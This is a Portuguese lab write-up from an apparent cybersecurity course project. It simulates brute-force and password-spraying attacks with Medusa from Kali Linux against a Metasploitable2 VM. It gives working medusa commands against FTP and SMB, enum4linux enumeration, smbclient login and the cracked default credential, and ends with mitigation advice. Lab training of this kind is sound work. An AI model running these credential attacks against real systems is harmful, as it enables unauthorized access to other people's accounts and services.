# DIO-Santander-Ciberseguranca


Simulando Ataques de Força Bruta com Medusa (Kali → Metasploitable2)
Resumo

Projeto prático que simula ataques de força bruta em um ambiente controlado usando Medusa (Kali Linux atacando Metasploitable2). Documenta ambiente, comandos, wordlists simples, evidências e recomendações.

Ambiente de teste

Host: VirtualBox (Host-Only)

VM Atacante: Kali Linux — 192.168.56.103

VM alvo: Metasploitable2 — 192.168.56.101

Observação: este teste foi executado apenas em laboratório controlado (Metasploitable2).

Arquivos de wordlists / usuários usados

No laboratório criei dois arquivos simples:

Criar users.txt:
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt

Criar pass.txt:
echo -e "123456\nmsfadmin\nqwerty\npassword" > pass.txt

Conteúdo (visível nos prints):

users.txt:

user
msfadmin
admin
root


pass.txt:

123456
msfadmin
qwerty
password

Comando utilizado (Medusa)

Executado a partir do Kali:

medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6


-h host alvo

-U arquivo de usuários

-P arquivo de senhas

-M ftp módulo FTP

-t 6 threads

Resultado observado (evidências)

Durante a execução, o Medusa testou combinações e retornou uma credencial encontrada:

Exemplo de linha capturada na saída do Medusa (print):
2025-10-21 00:11:24 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

Após isso, foi possível acessar o serviço FTP manualmente:

ftp 192.168.56.101
# Quando solicitado:
Name (192.168.56.101:cyber): msfadmin
Password: msfadmin
# Mensagem:
230 Login successful.



Como salvar logs (exemplo)
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6 2>&1 | tee outputs/medusa_ftp.txt
script -c "medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6" outputs/medusa_session.txt

ENUMERAÇÃO DE USUARIOS COM ENUM4LINUX

# enum4linux -a 192.168.56.101 | tee enum4_output.txt 
-a = ativar técnicas de enumeração + ip do alvo + tee "nome do arquivo" para gravar saída do comando num arquivo.
abrir o comando = $ less enum4_output.txt

Enumeração de senhas e acesso utilizando smbclient:
Tecnica password spraying = testa vários usuarios para mesma senha;

echo -e "user\nmsfadmin\nservice" > smb_ users.txt = criar wordlist de usuarios

echo -e "nmsfadmin\password\nWelcome123\n123456" > senhas_spray.txt = criar wordlist de senhas

medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50 = "ataque via smb testando 2 usuários ate 50 hosts paralelos"

VERIFICAR SE O ACESSO DESCOBERTO É VALIDO

smbclient -L //192.168.56.101 -U "usuario encontrato"

RESULTADO:

└─# smbclient -L //192.168.56.101 -U msfadmin
Password for [WORKGROUP\msfadmin]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE


Recomendações e Mitigações (resumo)

Desabilitar FTP se não for necessário; usar SFTP/FTPS.

Implementar bloqueio de conta ou bloqueio por IP após N tentativas falhas.

Forçar senhas fortes e políticas de expiração.

Monitorar logs de autenticação e alertar tentativas suspeitas.

Segmentar serviços (SMB/FTP) para redes internas apenas.
